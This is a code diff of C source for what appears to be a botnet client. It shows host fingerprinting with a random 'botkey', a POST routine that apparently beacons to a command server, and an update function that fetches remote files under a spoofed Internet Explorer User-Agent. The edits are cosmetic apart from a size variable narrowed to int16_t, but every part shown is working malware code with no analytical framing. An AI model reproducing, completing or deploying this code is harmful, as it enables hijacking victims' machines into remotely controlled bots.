@@ -108,19 +108,13 @@ void comm_init()
 {
 	struct utsname uinfo;
 	uname(&uinfo);
-	// printd("%s", uinfo.sysname);
-	// printd("%s", uinfo.nodename);
-	// printd("%s", uinfo.release);
-	// printd("%s", uinfo.version);
-	// printd("%s", uinfo.machine);
-	// printd("%s", uinfo.domainname);
 
 	comminfo.botkey = rand_string(20);
-	comminfo.cores  = _cores();
-	comminfo.mhz    = _mhz();
-	comminfo.bogos  = _bogos();
-	comminfo.bit    = _bit();
-	comminfo.arch   = uinfo.machine;
+	comminfo.cores = _cores();
+	comminfo.mhz = _mhz();
+	comminfo.bogos = _bogos();
+	comminfo.bit = _bit();
+	comminfo.arch = uinfo.machine;
 }
 
 static inline __attribute__((always_inline)) void processRecv(char *data)
@@ -147,10 +141,7 @@ static inline __attribute__((always_inline)) void processRecv(char *data)
 bool comm_comm(void)
 {
 	printd("POSTing");
-	char 	*reply = calloc(2048, sizeof(char *)),
-			*message = calloc(1024, sizeof(char *)),
-			*postreq;
-			
+	char *reply = calloc(2048, sizeof(char *)), *message = calloc(1024, sizeof(char *)), *postreq;
 	int sock, postlen;
 	struct sockaddr_in server;
 
@@ -225,7 +216,7 @@ failure2:
 bool update(char *url, char *site)
 {
 	char *msg;
-	int size = asprintf(&msg,
+	int16_t size = asprintf(&msg,
 			"GET /%s HTTP/1.1"
 			"User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)"
 			"Host: %s"
